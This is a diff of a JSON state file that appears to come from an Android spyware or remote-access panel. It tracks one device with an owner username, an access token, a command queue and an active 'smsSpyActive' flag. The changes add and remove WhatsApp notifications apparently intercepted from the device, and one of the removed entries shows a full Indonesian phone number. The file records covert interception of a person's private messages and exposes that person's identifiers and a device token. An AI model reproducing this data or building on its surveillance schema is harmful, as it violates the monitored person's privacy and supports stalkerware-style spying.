@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775928588752,
+    "lastSeen": 1775928591882,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘",
+        "content": "‎2 pesan baru",
+        "time": "12/04 00:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775928592003
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘",
+        "content": "Anda ditambahkan",
+        "time": "12/04 00:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775928590649
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘: 𝗬𝗨𝗞𝗜 𝗦𝗧𝗢𝗥𝗘",
@@ -4107,22 +4123,6 @@
         "time": "11/04 23:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775925129178
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke +62 895-3713-33331",
-        "time": "11/04 23:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775925128345
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke +62 895-3713-33331",
-        "time": "11/04 23:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775925127994
       }
     ],
     "galleryPhotos": [],
